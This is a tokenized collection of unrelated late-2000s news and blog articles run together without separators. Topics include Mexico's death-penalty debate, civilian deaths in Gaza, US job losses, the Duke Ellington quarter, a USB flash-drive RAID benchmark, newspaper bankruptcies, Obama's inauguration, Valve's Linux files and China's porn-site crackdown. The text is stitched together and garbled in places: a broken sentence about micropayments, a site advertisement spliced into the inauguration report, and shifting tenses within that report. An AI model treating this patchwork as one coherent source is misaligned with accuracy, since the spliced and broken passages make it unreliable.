The move follows a surge in murders and kidnappings in the country , many linked to drug cartels and organised crime .
Mexico abolished capital punishment in 2005 , but recent surveys suggest that 70 % of Mexicans are in favour of the death penalty .
The campaign to reinstate judicial executions has , unusually , been led by Mexico 's Green Party .
Hundreds of posters , carrying the Green Party logo , and demanding capital punishment for murderers and kidnappers have appeared all over Mexico City .
The party says it is simply conveying the voice of the people , but its opponents say it is playing politics .
No date has been set for the forums , which will bring together crime experts , academics and human rights campaigners .
The chances that the Mexican constitution will actually be amended currently appear remote .
The government , church and human rights groups all strongly oppose reinstatement .
Mexico has long been powerful voice in international forums calling for the abolition of capital punishment and has not carried out an execution since 1961 .
But millions of Mexicans are appalled by the rising insecurity in this country , and are looking for any means to try to control it .
The small dead bodies were laid next to one another on the tiled floor of the morgue corridor , the blood drained from their cheeks .
One had a bandage still wrapped around his head , another lay with his mouth half - open in his oversized , bloodstained clothes .
For a week the Samouni family had taken shelter in their small , single - storey home in Zeitoun , south - east of Gaza City , and there they survived wave after wave of Israeli bombing and artillery strikes .
Then came Israel 's ground offensive , the next phase in what Israel argues is a necessary and justified battle against the Palestinian militants firing rockets out of Gaza .
The Israeli prime minister , Ehud Olmert , promised an " iron fist " for Hamas and said he would treat the civilian citizens of Gaza with " silk gloves , " though the Palestinians of Gaza know perhaps better than most that there are few silk gloves in war .
The Samouni family woke on Sunday morning to find themselves surrounded by camouflaged Israeli troops and dozens of tanks , who had set up a position in the rubble of what was once the large Jewish settlement of Netzarim .
As dawn broke , the soldiers seized control of the highest buildings in the district and ordered several of the neighbours into the Samouni family home and there a dozen of them waited , without food and without water .
" All day Sunday there was shooting and bombing .
We did n't have anything to eat , we did n't have water to drink - our water tanks had been damaged in the fighting , " said Wael Samouni , 32 , who on a normal day would be manning his stall at the vegetable market .
" We could n't sleep . "
He stepped out of the house briefly and saw a man shooting an M16 assault rifle .
He mistook him for a Palestinian militant .
Samouni shouted at him : " Please do n't come here .
They 'll kill us .
Go away . "
But as the gunman turned round , it became clear he was an Israeli soldier .
The soldier shouted back in Arabic : " Bring me your ID . "
Samouni disappeared back into his house and decided not to venture out again .
They passed another night under the bombing and artillery strikes , grateful to have made it through to morning .
Samouni remembered sitting in the crowded living room yesterday , surrounded by his neighbours , wondering how much longer they had to endure .
It was 6.30 am .
" We were sitting and suddenly there was bombing on our house and everyone started to run .
There were three rockets .
I have no idea where they came from , " said Samouni .
The rockets , believed now to be tank shells , hit the building and brought it crashing down .
" I looked to my side , took hold of my boy Mohammad and I started to run .
As I ran I looked back and saw on the floor my mother , two cousins and three of my children .
All dead , " he said .
Samouni and the others ran from the house , some raised white cloths as flags and they made it to a patch of safe ground where they were taken to hospital by car .
Yesterday , as three of his children were laid out dead on the hospital floor , Samouni was in a bed upstairs in the Shifa hospital , recovering from wounds to his legs and shoulder and comforting his son Mohammad , five , who had suffered a broken arm in the shelling and had just woken after his operation .
He was still unsure exactly how many of his 10 children had died .
" It 's a massacre , " Samouni said .
" I 'm 32 years old and I 've never seen such things as this .
I could n't help myself or any of those around me .
We just want to live in peace . "
At his bedside was his brother Nael , 36 , who lives in a house close by .
His wife and daughter had been in Wael 's house yesterday morning at the time of the shelling : both were killed .
" I wanted to go and join them the night before , but it was too dangerous to go out .
If anyone moved he would be shot , " Nael said .
" Then when I heard the bombing this morning I saw people running .
I saw an injured man fall to the ground .
I ran to help , but there was an Israeli sniper in the house next door who shouted : ' Leave him alone . '
We could n't rescue anyone . "
As he ran , Israeli troops fired over their heads and then ordered them to lift up their shirts to show they carried no weapons under their clothes .
" We just made it out and here to the hospital , " Nael said .
Then , in a moment of anger , he pointed the blame .
" Hamas is responsible for this .
They are starving us , now they are killing us , " he said .
" They asked the Israelis to enter but where is the resistance ?
They are hiding .
All the leaders of Hamas are underground .
It 's just the civilians confronting the Israeli army .
I do n't like Hamas and I do n't want them ruling Gaza . "
Hospital officials believe nine people were killed in the Samouni house , including at least four children .
But they were not the only civilians to die at the hand of the Israeli offensive yesterday .
Just north of Gaza City in the Shamali district , a missile struck a three - storey apartment block in the middle of the night - home to three brothers , their families and their father .
It hit the roof and dropped down to the basement , destroying half the building and killing Amer Abu Asha , 47 , along with his two wives , three sons and one daughter .
Yesterday his brother Samer Abu Asha , 50 , sat outside on a plastic chair under a green awning .
Neighbours came to shake his hand and offer their sympathy before slipping away quickly to avoid the next missile strike .
The family were not asleep at 1.30 am yesterday when the Israeli missile struck - the noise of the bombing had been too much .
In the moments after the attack there was such confusion no one knew who or how many had died .
" We started searching but it was hard with the dust , the darkness and the smoke , " said Abu Asha .
Neighbours told them bodies had been taken to the hospital , so they rushed to the Shifa in Gaza City , only to be told no one from their family had been admitted .
" We went back home and searched everywhere , " he said .
Finally they found his brother Amer lying on a patch of ground outside the house , mortally wounded , his stomach ripped open .
" We started to search for others under the rubble .
We found arms , legs , half a head , " he said .
" We did n't find a complete body . "
Abu Asha admitted that another brother in the family - but one who did not live in the building - was in the Hamas military wing but said he could not account for the bombing .
They had received no warning .
" It 's unjust .
They are targeting civilians , children , old women , " he said .
" Some European and Arab countries are supporting Israel in this terrorism .
They want to crack down on Hamas , but Hamas is not in the houses .
It 's on the front line .
Go there and kill them .
Not us . "
The BBook of Geek :
The Only Geek Humor Book You 'll Ever Need Citadel Press 104 ( hexadecimal ) pages $ 14.95 Shop.Ars
Life does n't present many opportunities to watch the entire Star Trek canon and call it " research , " and when it does so , you 'd be a fool to pass up the chance .
Brian Briggs is no fool , and when Citadel Press offered the BBSpot editor a contract to write The BBook of Geek , Briggs used the book as an excuse to burnish his geek cred .
He watched every original Star Trek episode and set his phasers to stun .
He watched X - Files episodes and wanted to believe .
He watched Babylon 5 and , err ... admired the Amiga - produced CG effects .
Oh , it might sound like fun , but Briggs worked hard .
He resorted to watching sci-films at 1.5 - 2 x speed with the pitch adjusted .
He boned up on science at the Ann Arbor public library .
And he was forced to play video game after video game .
The result is one of the few geek humor books on the market .
It certainly has the " geeky " bit nailed ; the book 's pages are numbered in hexadecimal , cover the vi/emacs dispute , and feature a picture of Briggs in a " ROFLcopter " T - shirt .
As for the humor , that 's a bit more subjective ; its success depends on just how funny you find articles titled , for example , " Mythbusters to produce controversial ' Myths of Jesus ' Episode . "
So you want to write a book ?
It 's an opportunity that Briggs never expected .
As he admits with a grin , the book project basically fell into his lap .
Briggs started BBSpot back in 2000 , hosting the fledgling site on a trial basis using a free domain .
He was working a full - time job , but by 2003 had moved the site to its own domain and was doing well enough that he quit his day job and made BBSpot a full - time gig .
Six years on , he remains the only paid employee and says he still loves what he does .
If the site has n't grown into a media empire , that 's in part by choice ; Briggs wants only to make enough money to keep doing the job , to " stay sustainable " as he puts it .
In 2007 , he was asked to write a book review of Prank the Monkey for another site .
After doing so , the author of that book introduced Briggs to his own editor .
The editor asked if Briggs had ideas to pitch ; he came up with some ; one was accepted ; boom , he had a book deal .
This can make for a spot of awkwardness when bumping into Ann Arbor writer friends who have struggled against the adamantine bonds of fate in their attempts to secure a similar deal or even track down a literary agent who will take them on .
One imagines a bit of jealousy on their part when Briggs showed up for a book signing at the Ann Arbor Borders bookstore ( the first Borders , and still the company 's flagship ) and attracted 60 people .
Not bad for a geek with a basement office .
Getting your geek on
The format of the book could n't be simpler .
Briggs breaks his geeky topics into " pillars " : software , TV , literature , gaming , movies , science , hardware , and the Internet .
Each pillar is made up of suitably geeky blocks , and we are n't just talking Firefly references or the occasional Cthulhu nod ( though those exist ) .
Briggs digs deep : Visicalc , Perl , Red Dwarf , Nethack , Metropolis , Brazil ( which , really , you should n't miss ) , Alan Turing , and Jonathan Coulton .
Each topic gets a two - page spread .
On the left sits a brief description of the topic 's " geek cred , " followed by some geeky facts about the topic — only a few of which are true .
A picture of Biggs inventively dressed up as the topic fills out the page .
On the right is a brief , Onion - style news article , such as " Softer , Gentler Cthulhu More Profitable Than Ever Before . "
Elder God Cthulhu has found marketing a softer , gentler version of himself to be more profitable than an " insanity - causing just because you looked at me " one .
In the past , Cthulhu generated most of his revenue from donations from various cults , but the high cost of maintaining cults , along with the lower - income people who frequented the cults , led to a reimagining of its image .
Now Cthulhu generates most of his revenue from licensing his image for plush dolls and bumper stickers .
" People just do n't understand all the costs associated with cults .
There are the animals for sacrifice , the worshippers ' compensation insurance ; it gets expensive , " said Cthulhu 's representative , Zvilpogghua from the PR firm Han , Hastur , and Zvilpogghua .
" We 're finding it much easier to control people through mass media buys than mind control . "
You get the idea .
Unemployment is likely to rise , say economists
The US jobless rate rose to 6.5 % in October , official figures have shown , the highest rate since March 1994 .
Figures from the US Labor Department showed US employers cut 240,000 jobs in October , the 10th month in a row that the economy has lost jobs .
The increase means that in the first 10 months of this year , 1.2 million people in the US have lost their jobs .
US President George W Bush said the figures reflected " the difficult challenges confronting our economy " .
" We are in the midst of a global financial crisis , and tight credit markets have made it harder for businesses to borrow the money they need to meet their payrolls , grow , and create new jobs , " he said .
" The Federal government has taken aggressive and decisive measures to address this situation . "
But he said it would take time for the stimulus measures to have their full impact on the economy .
Revised figures
Some economists predict the jobless rate could climb to 8 % , or possibly higher , next year .
Job losses in August and September turned out to be much deeper than initially estimated by the Labor Department .
Employers cut 127,000 positions in August , compared with 73,000 previously reported , while 284,000 jobs were axed in September , compared with the first estimate of 159,000 jobs .
The revised figures for September showed the biggest monthly cut in jobs since November 2001 .
Worsening economy
The employment market is much weaker than economists expected .
They were forecasting the unemployment rate to climb to 6.3 % in October and for payrolls to fall by about 200,000 .
The department said 481,000 people in the US filed new claims for jobless benefits in the last week of October .
On Friday , car giant Ford announced plans for more job cuts after reporting third quarter operating losses of $ 2.98 bn .
The firm it would cut its salary costs by an additional 10 % by the end of January 2009 .
Racing to assemble his new Democratic cabinet , President - elect Barack Obama will meet with economic advisers later on Friday .
His team has been in close contact with the Bush administration to pave the way for a smooth handover of power .
All the economy 's woes - a housing collapse , mounting foreclosures , hard - to - get credit and financial market upheaval - will confront Mr Obama when he assumes office early next year - and the employment situation is likely to get worse .
In the 1980 - 1982 recession , the unemployment rate rose as high as 10.8 % before coming down .

WASHINGTON ( CNN ) --
The United States Mint launched a new coin Tuesday featuring jazz legend Duke Ellington , making him the first African - American to appear by himself on a circulating U.S. coin .
The District of Columbia coin honoring Duke Ellington was introduced Tuesday in Washington .
Ellington , the composer of classics including " It Do n't Mean a Thing If It Ain't Got That Swing " appears on the " tails " side of the new D.C. quarter .
George Washington is on the " heads " side , as is usual with U.S. quarters .
The coin was issued to celebrate Ellington 's birthplace , the District of Columbia .
U.S. Mint Director Ed Moy introduced the new coin at a news conference Tuesday at the Smithsonian Institution 's National Museum of American History .
Members of Ellington 's family were present at the ceremony , and the jazz band of Duke Ellington High School performed .
Ellington won the honor by a vote of D.C. residents , beating out abolitionist Frederick Douglass and astronomer Benjamin Banneker .
Also on the coin is the phrase " Justice for all . "
The Mint rejected the first inscription choice of D.C. voters , which was " taxation without representation , " in protest of the district 's lack of voting representation in Congress .
Edward Kennedy " Duke " Ellington received 13 Grammy Awards and a Pulitzer Prize , among numerous other honors .
His orchestra's theme song , " Take the A Train , " is one of the best - known compositions in jazz .
Ellington was born in the district in 1899 and composed more than 3,000 songs , including " Satin Doll , " " Perdido " and " Do n't Get Around Much Any More . "
" It Do n't Mean a Thing If It Ain't Got That Swing " helped usher in the swing era of jazz .
Ellington performed with other famous artists , including John Coltrane , Louis Armstrong and Ella Fitzgerald , and he traveled around the world with his orchestras .
He died in 1974 at the age of 75 .
The first African - American to appear on a circulating coin was York , a slave who accompanied Lewis and Clark on their " Corps of Discovery " adventures across America at the dawn of the 19th century .
The 2003 Missouri quarter features the three men together in a canoe on the obverse .
The U.S. Mint distinguishes between circulating coins , which are intended for daily use , and commemorative ones , which mark special occasions .
African - Americans including Jackie Robinson , who broke baseball 's color barrier , have appeared on commemorative coins .
Educator Booker T. Washington , botanist George Washington Carver and the first Revolutionary War casualty , Crispus Attucks , all of whom were black , have also appeared on commemorative coins , according to the U.S. Mint .

SanDisk Cruzer Titanium x6
Can a software raid array of 6 usb flash drives perform well ?
Is it silly to even try ?
Well theres one way to find out .
Flash memory as a main storage medium is a relatively new phenomenon .
Flash is known for its lack of seek time , so we wanted to see just how much bandwidth we could squeeze out of these devices over the USB bus .
It turns out that even with all of the limitations of the USB bus working against us we were still able to obtain some very good results at a very nice pricepoint .
The USB Bus
The usb bus is very convenient for peripherals .
However , it was not designed for high bandwidth IO .
USB 2.0 Hi-Speed mode is 480 megabits per second , which translates into 60 megabytes per second .
A single host controller can have up to 127 devices connected , although each device has to split the 480 megabit bandwidth .
USB protocol does not have any client interrupts so the host controller must poll each device at regular intervals .
Furthermore the packet size of the bus is small so there is significant bandwidth eaten by packet overhead .
Hardware
Flash Drives : 6 x Sandisk Cruzer Titanium 2G . ( 12 GB in total ) .
These had an approximate street value of about $ 20 each when purchased .
Besides being relatively fast they also look sleek .
USB Controllers : 2x Intel 82801I ( ICH9 Family ) USB controllers .
These were the controllers accompanying standard USB ports on the motherboard .
These are ordinary and compliant devices .
Software
U3 Removal Tool ( Requires Windows )
Stops the Flash device from trying to create a fake auto - run cdrom device when plugged in .
Linux : Kernel v2.6.24.4 x86_64
Raid tool : mdadm v2.6.4
Raw read tool : dd
Filesystem benchmark : Bonnie ++
Except for the U3 removal , these tools were used in a System Rescue CD livecd environment .
##Remove U3 software for Windows
The first thing we did was plug in a single Cruzer to test its speed .
Out of curiosity we checked dmesg to see what it shows :
[ 316.394543 ] usb 2 - 7 : new high speed USB device using ehci_hcd and address 5 [ 316.455304 ] usb 2 - 7 : configuration # 1 chosen from 1 choice [ 316.456930 ] scsi7 : SCSI emulation for USB Mass Storage devices [ 316.460152 ] usb - storage : device found at 5 [ 316.460157 ] usb - storage : waiting for device to settle before scanning [ 318.730555 ] usb - storage : device scan complete [ 318.731462 ] scsi 7:0:0:0 : Direct - Access SanDisk U3 Titanium 3.27 PQ : 0 ANSI : 2 [ 318.732368 ] scsi 7:0:0:1 : CD-ROM SanDisk U3 Titanium 3.27 PQ : 0 ANSI : 2 [ 318.748159 ] sd 7:0:0:0 : [ sdb ] 4001422 512 - byte hardware sectors ( 2049 MB ) [ 318.749558 ] sd 7:0:0:0 : [ sdb ]

This disc does n't have any tracks I recognize !
Well that was odd , we didnt notice any cdroms attached to our flash drives .
It turns out that this artificial cdrom is how the drive normally installs its U3 software in Windows via autorun .
Googling showed us that we could remove the U3 software from within Windows .
So we booted Windows , downloaded the U3 removal tool and removed U3 from all the devices .
This is n’t technically necessary because the drives will still work in Linux with the fake cdroms ignored , but it made dmesg cleaner .
And cleanliness has some relation to godliness , or so its been said .
A Single Device Benchmark
As for initial benchmarks on a single stick , Sandisk claims 9 mb / s write and 20 mb / s read .
Using dd on the raw / dev/sdX devices showed that the devices write at speeds between 7 - 9 MB /s and read between 18 - 20 MB / s .
Interestingly writing to a device changed its read rate , this is perhaps due to internal wear leveling .
Overall , each of the flash drives performed almost identically .
Raid0 on a Single USB Bus
As we mentioned earlier , a USB bus has a bandwidth of at most 480 megabits per second .
It would be useful to known how many devices you can fit on a single USB bus and still be able to improve the amount of bandwidth that can be squeezed out of a single host controller .
So we plugged in devices and started running dd .
This is what we found :
After three devices the read speed was almost completely topped out .
Adding more devices had only a marginal gain .
This makes sense since three 20 mb / sec devices could be able to saturate a 60 mb / sec bus .
The chunk size of the raid array did have some influence on the speed of the raid .
It seems that even though seek times are close to zero there is initialization and bus contention to deal with , this causes the optimal chunk size to be somewhere in the 32k - 512 k range .
But what about write speeds ?
Our device only writes at 9 mb / sec tops , so theoretically we should see gains with up to 6 or even 7 devices .
But what about in practice ?
At first there are linear gains when adding devices .
However , by the time we added the fourth device we started to see some bus limitation penalties .
It does seem that chunk size has very little impact on the speed of write operations .
Overall the read speeds top out at about 45 mb / sec while the write speeds max at 38 mb / sec .
Raid0 on a Pair of USB Buses
But wait a second , this motherboard has two buses .
We plugged in half of the devices to the first host controller and half into the second host controller .
When creating the raid , you have to choose the order the raid uses the devices .
Tests showed that interleaving the device - bus order had no effect over non-interleaved device - bus order .
We chose to interleave them anyway .
With 6 devices we are reaching 80 mb / sec .
It appears the optimal chunk actually depends on the number of devices used .
Lets take a look at writing speeds
As we saw earlier on the single bus , when there are very few devices on the bus the performance gain by adding an additional device is nearly linear .
This translates into the raw speeds from dd showing a very decent read rate of 80 mb / sec and write of 50 mb / sec .
Filesystem tests
Our last test was to run through our most optimal setup , the 2 - bus 6 - device configuration and try different filesystems with Bonnie ++.
An interesting note is that Reiser4 shined in the benchmarks .
However , it performed very poorly when used as the root and home partition of a desktop system .
On our desktop system we tried reiser4 with lzo compression and reiser4 with default settings .
In general performance was extremely good , especially with the lzo compression .
The problem we encountered were very long pauses when writing to files .
For instance , saving in emacs had a significant delay at times , as much as half a second at times .
Other programs , such as pidgin would cause the system to chop every time you move a window around the screen ( was it writing to configuration files ? ) .
It might have something to do with synchronous IO calls because not every program did it .
In retrospect , it would have been smart to also record and evaluate seek time and small file tests on each filesystems because the chunk size might have had an adverse affect on such operations .
The only other filesystem tested on a live desktop system was ext3 and it performed beautifully .
Applications with traditionally long loading times ( GIMP , OpenOffice , etc ) start considerably faster than on a traditional hard drive .
Conclusions
The performance of the RAID is actually remarkably good .
Compared to buying a standard SSD this RAID beats all available drives on a price per performance ratio .
Based on prices of popular online stores we can see that this solution costs less than half the price of most current SSDs and has the same read and write speeds as the higher end SSDs .
Although we are left with one big unknown .
Flash is known to eventually fail after a certain number of writes , will our RAID fail quickly ?
USB flash sticks are n’t renowned for their reliability .
Based on the feel of the system , we have chosen to use this RAID as part of a production system ( we will keep Bacula running just to be safe ) .
Day 1 of the flash - raid - as - root starts today .

Four major newspaper firms have now declared bankruptcy .
The rest of the industry is on the ropes — sources of credit or equity funding have virtually dried up ; there is basically no market into which to sell publishing assets to raise cash ; the ability to maintain quality and to innovate is seriously hampered by continual cost - cutting necessary to maintain positive cash flow and meet debt service obligations .
Many individual newspapers , especially in metropolitan areas , are reportedly operating in the red .
Further bankruptcy filings seem inevitable .
We ’ve seen this before in other legacy industries , most notably U.S. railroads .
In 1920 , trains carried a total of 1.2 billion passengers , the peak year for rail travel in this country .
Despite a few upticks during the late 1930s and World War II , it was all downhill after that as personal automobiles , buses and airplanes siphoned off traffic , and as government policy failed to encourage rail travel as it did in Europe .
For five decades , railroad companies struggled against the tide but failed to adapt .
By 1970 , much of the industry was bankrupt .
Today , the government - owned Amtrak system carries a grand total of 29 million passengers a year , about 2.4 percent of the 1920 level .
The discerning reader will notice some parallels with long - term trends in the daily newspaper industry :
Printed daily newspaper circulation ( as reported by the NAA ) hit a peak of 63,340,000 in 1984 ( having been virtually flat for the previous 10 years ) , and has since declined to 50,742,000 in 2007 .
( Undoubtedly , the 2008 level will be reported under 50 million . )
Like the railroads of yore , newspapers are challenged from multiple sides by disruptive innovations , as well as by a long demographic shift away from printed news consumption that has raised the age of the median printed newspaper reader to nearly 60 .
Newspaper print advertising revenue , in actual dollars ( no inflation adjustment ) , hit a peak of $ 48.67 billion in 2000 .
For 2007 revenue was down to $ 42.21 billion , and when 2008 is reported ( any day now ) , the figure will be about $ 35 billion .
Online advertising at newspaper sites has grown from $ 1.22 billion in 2003 ( the first year reported by NAA ) to $ 3.17 billion in 2007 .
It will come in roughly unchanged in 2008 .
However , ( a ) online revenues include a questionable level of forced “ upsells ” from print , and ( b ) online revenues do n’t cover the cost of online operations .
And what really points to their insignificance is the fact that Google ’s 2008 online ad revenue topped $ 21 billion and grew 29 percent over 2007 .
The ad numbers appear bad enough viewed in those terms , but a more realistic measure is to look at the newspaper industry ’s share of total advertising dollars , over time , across all media .
This eliminates the effect of inflation and puts the numbers in context .
I ca n’t find numbers prior to 1948 , but it seems likely that newspapers hit their share of market peak around 1920 just as rail travel did .
In my previously published chart showing share of total advertising for individual media , newspapers owned 37 percent of total ad dollars in 1948 and have fallen steadily ever since , sliding at 15 percent in 2007 , with an accelerating drop in the last few years .
With a 10 percent share of overall advertising obviously ahead this year or next year , and all the other trend lines pointing ominously toward catastrophe , the sustainability of the industry is in serious question .
Bankruptcy , as a legal mechanism , is not intended to encourage innovation , and does n’t often result in a newly - conceived enterprise ready to meet the challenges of a new age .
It ’s possible that only a few more newspaper firms make Chapter 11 declarations , but the rest of the industry will be teetering at the brink .
Restructuring is a problem for the industry as a whole , not just for bankrupt firms .
The industry has a narrow time window in which to consider some drastic moves not only to simply survive through bankruptcy or skate around its edge , but to emerge from this recession with a structure that can enable a thriving news industry .
Here are some of the options that need to be considered in the next weeks and months , not years :
Consolidation at a corporate level .
There may not be many more economies of scale to be had by combining multiple newspaper companies into a single entity , but some savings are better than no savings .
A large consolidated entity with a new vision might attract new investment .
The downside , of course , is that big corporations will get even bigger , more inflexible , and further removed from local realities .

Consolidation at the city and regional level .
As we ’re seeing in Denver and Seattle , fewer areas will sustain multiple newspapers .
Given the economic climate , antitrust issues are unlikely to get in the way of fully combined operations and publications to replace JOAs or competing papers .
This has its downside also , but it ’s probably the most inevitable development .

An accelerated move to online - first ( and only - only in some instances ) .
When big - box store chains go bankrupt and avoid liquidation , they generally shed a slew of unprofitable locations .
Rather than locations , newspapers should shed unprofitable days .
In many markets , a good hard strategic analysis would result not just in trimming a day or two , but in an online - first news organization publishing in print only once or twice a week .
To me , this actually would be the most promising development that could emerge .

Vertical de-layering .
This would be a natural consequence of any newspaper firm that truly decided to focus on being a digital enterprise .
A delayered organization would keep the capacity to generate content and to sell advertising , and would let someone else own their buildings , their presses and their distribution organizations .

Merge or collaborate with other local media .
I ’ve pointed out that once a paper decides to publish less than four days a week , it can bypass the cross - ownership rules and get in bed with local TV and radio stations .
The opportunities for content sharing , cross-selling and administrative efficiencies are huge .
There would be endless handwringing about the need to maintain multiple independent points of view , but the reality is that there are more “ voices ” in any market today than ever before , and anyone can launch a new one on their proverbial kitchen table .
Unfortunately , only the first two options are likely to be pressed by bankruptcy courts and creditors ; the last three require strategic vision that ’s not going to emerge from the offices of lawyers and accountants .
But one can hope that somewhere in the industry there is some capacity for far - sighted thinking .
What wo n’t happen : ( a ) a government bailout ( there ’s no cash or appetite for this ) ; ( b ) rescue by non-profit foundations ( they have no cash or appetite for this , either ) ; ( c ) Pay - for - content on a subscription model ( see Matt Ingram on this subject ) ; ( d ) pay - for - content on a micropayment model .
( Micropayments ca n’t be implemented in the newspapers have left to find solutions .
But there are opportunities in the longer run , I believe , for an innovative two - way micropayment model . )
President Barack Obama says he is taking the helm of a nation that is " in the midst of crisis . "
He said in his inaugural address that the challenges " will not be met easily or in a short span of time " .
But he said , " they will be met . "
Download the new Independent Premium app Sharing the full story , not just the headlines
Describing the challenges ahead , he said : " That we are in the midst of crisis is now well understood .
Our nation is at war , against a far - reaching network of violence and hatred .
" Our economy is badly weakened , a consequence of greed and irresponsibility on the part of some , but also our collective failure to make hard choices and prepare the nation for a new age .
" Homes have been lost ; jobs shed ; businesses shuttered .
Our health care is too costly ; our schools fail too many ; and each day brings further evidence that the ways we use energy strengthen our adversaries and threaten our planet . "
He said : " Every so often the oath ( of office ) is taken amidst gathering clouds and raging storms " .
He said : " Power alone cannot protect us . "
The US would " begin to responsibly leave Iraq to its people and forge a hard - earned peace in Afghanistan " .
He told the world 's Muslims that his administration will be looking for a " new way forward , based on mutual interest and mutual respect . "
And he is warning leaders around the globe who try to encourage conflict and " blame their society 's ills on the West " that their people will judge them on what they build , not what they destroy .
He is also pledging to " work alongside " the people of poor nations to make " farms flourish and let clean waters flow . "
Barack Obama was speaking after he made history when he was sworn in as the first black US president , riding a wave of public optimism he will need to tap to deal with the worst economic crisis in 70 years and two wars .
An estimated million people , bundled up against the cold and in a festive mood , packed Washington 's Mall , which stretches 2 miles from the Capitol to the Lincoln Memorial on the Potomac River , and along Pennsylvania Avenue to the White House .

Obama , a Democrat , was due to be sworn in as the 44th US president just before noon EST ( 1700 GMT ) , taking over from Republican George Bush .
The inauguration was taking place amid unprecedented security .
About 8,000 police were deployed and a total of 32,000 military personnel were on duty or on standby .
The Homeland Security Department said authorities were investigating a potential threat of " uncertain credibility " in connection with the inauguration .
This will be the first inauguration of a new president since the Sept. 11 , 2001 , attacks that took place early in Bush 's two - term presidency and shaped his policies , prompting Washington 's war on terrorism .
Obama 's election has also stirred white supremacists to anger , sparked arrests during his campaign and raised assassination fears .
Major US stock indexes fell on Tuesday on mounting worries over grim earnings and the health of the banking sector , highlighting the scale of the financial problems Obama will face .
The inauguration of Obama , 47 , the son of a black Kenyan father and a white mother from Kansas , will be full of ceremony , and full of symbolic meaning for African - Americans , who for generations suffered slavery and then racial segregation that made them second - class citizens .
Obama was set to take the oath of office with his hand on a Bible used by Abraham Lincoln at his first inauguration in 1861 , standing on the western steps of the capitol , a building that was partly built by black slaves .
Some estimates put the number of people expected to pack the Mall and inaugural parade route at more than 2 million .
Crowds clogged the city 's metro rail system and thronged the security check - points .
A 68 - year - old woman was hit by a train at the crowded Gallery Place downtown metro station after she fell to the tracks .
She was alive when emergency personnel removed her , authorities said .
The incident caused delays on the rail line serving the station near the heart of the action .
" This is chaos now , " said Judy Bailey , 42 , of Cincinnati , Ohio , as police shunted her further and further away from the swearing - in ceremony early in the morning .
" But it is amazing to be here .
This is history in the making . "
Polls show widespread support for Obama and optimism about the coming four years of his presidency , despite a deepening recession that has saddled the country with a $ 1 trillion deficit and 11 million people unemployed .
Bush is leaving office having plumbed record lows in approval ratings .
Obama , a former Illinois senator who capped a hard - fought election campaign with a comfortable win against Republican John McCain in November , has stressed that the time to party and celebrate will be short - lived .
On Wednesday he will start shepherding an $ 825 billion economic stimulus plan through Congress .
He faces daunting challenges - economic turmoil , the wars in Iraq and Afghanistan , global warming , conflict in Gaza , tensions between Pakistan and India and a resurgent Russia .
But analysts say that at least for now , it will be his ability to revive the recession - hit economy that will be the benchmark by which his presidency is judged .
The Washington Post reported that in one of his first actions as president , Obama planned to name former Sen.
George Mitchell as his Middle East envoy in one of his first actions as the new US president .
Obama is expected to meet military commanders on Wednesday to discuss the US troop withdrawal from Iraq , to fulfill a campaign pledge to withdraw all troops within 16 months .
Obama 's swearing - in will be followed by the US Marine Corps band playing " Hail to the Chief " and a 21 - gun salute .
Obama will then to deliver his eagerly anticipated inauguration speech , expected to last about 20 minutes , just after midday .
" He is going to lay out a lot of the challenges we face as a country , but he will also remind ... that America has faced great challenges before , " his spokesman Robert Gibbs told CNN on Tuesday .
" He will talk about responsibility , particularly the great responsibility in the action of government and financial institutions , some of whose actions have got us into the mess we are in now . "
He played down suggestions that Obama could issue executive orders as early as Tuesday to close the US military prison at for foreign terrorism suspects at Guantanamo Bay and repeal a ban on overseas funding for clinics or groups which provide abortion services .
The Guantanamo prison has been a lightning rod for broad world disapproval of many Bush policies in the US war on terrorism .
Gibbs said some announcements would be made later in the week .
Obama and his wife , Michelle had coffee at the White House with the Bushes and Vice - President Dick Cheney and his wife after attending a church service .
Obama then headed toward the Capitol for the swearing - in ceremony .
Though some will protest that its DRM system is detestable , Valve 's Steam platform is by far one of the best compromises between publishers and gamers , and it's a key contributor to the overall health of PC gaming .
Valve has gradually developed the once - despised platform into something worth supporting , but if there is any one remaining flaw of the system , it 's that the service is not cross- platform compatible .
However , if some snoopers who have found Linux binaries in Valve code are correct , that may need a qualifying " yet . "
Some crafty penguin - heads have come across a bit of interesting code buried deep within the Windows client for the Left 4 Dead demo .
According to phoronix , the Windows demo contains a number of shared libraries for Linux , including a number of APIs that are at least named to suggest they could play a key role in a Linux - capable version of the game and Steam itself : files like steamclient_linux .
so , studiorender_i486.so , vstdlib_i486.so , libsteam_api_linux.so , and engine_i486.so .
Within them , a number of strings pertaining to data unrelated to the game or a Linux - based server ( or its subsequent command - line client ) for it , including some global Steam calls , were found .
While this is hardly definitive proof of anything , the gents over at phoronix note that this follows the company 's recent call out for a senior software engineer to port games to Linux .
With the recent improvements to the platform — most notably Steam Cloud , which unties a specific PC from the platform equation — it does n't seem entirely out of the question that Valve would be striving to build a gaming service that is completely platform - agnostic .
China 's war on porn has taken down nearly a hundred websites so far , and there 's no sign of stopping anytime soon .
Ninety - one websites have been taken offline for hosting or pointing to pornographic and " vulgar " content since last Thursday , according to the state - run news agency Xinhua , and authorities are continuing to crack down on sites that the government does n't feel is appropriate for young people .
Pornography has been and is still illegal in China , but it 's not difficult to get , thanks to technology and the Internet .
China attempts to block access to porn through its infamous Great Firewall , but even that has its flaws and determined users can still seek out the uh , " relief " they need without much searching .
The Chinese government has repeatedly condemned Internet pornography for " perverting China 's young minds , " which has led to its newest initiative to " purify the Internet . "
Two of the sites shut down over the weekend include www.789b.com and www.678tp.cn, neither of which have been accessible since Sunday , and there are more on the way .
" Authorities have vowed to beef up crackdown efforts in the following days and urged law - breakers to voluntarily turn themselves in to local public security departments , " noted Xinhua .
Now , not only is China looking at sites that host vulgar content , it also has search engines like Baidu and Google in its crosshairs for not doing enough to block links to porn in an " efficient " manner .
In fact , authorities named some 33 sites for merely linking to porn in an attempt to shame them into complying .
But while the companies may be able to reduce some of their links to the more obvious porn sites , it will be no small feat to attempt to eliminate them altogether .
The Internet moves quickly and search engines index new content almost as fast .
Whether Google or Baidu will be able to meet China 's demands remains to be seen , but we 're sure glad we 're not the ones trying to figure out how to do it .

EIAL is an interdisciplinary journal of Latin American studies , published since 1990 by the Sverdlin Institute for Latin American History and Culture at Tel Aviv University .
The journal ’s two annual issues ( January and July ) feature articles from across the social sciences and humanities , usually with a strong historical and qualitative focus .
With the intention of offering a unique space for an ongoing and pluralistic dialogue between diverse academic traditions and scholarly approaches both from Latin America and the rest of the world , we welcome submissions of original research articles written in English , Spanish , and Portuguese .

Jupiter has a rocky core that is more than twice as large as previously thought , according to computer calculations by UC Berkeley and University of Arizona scientists .
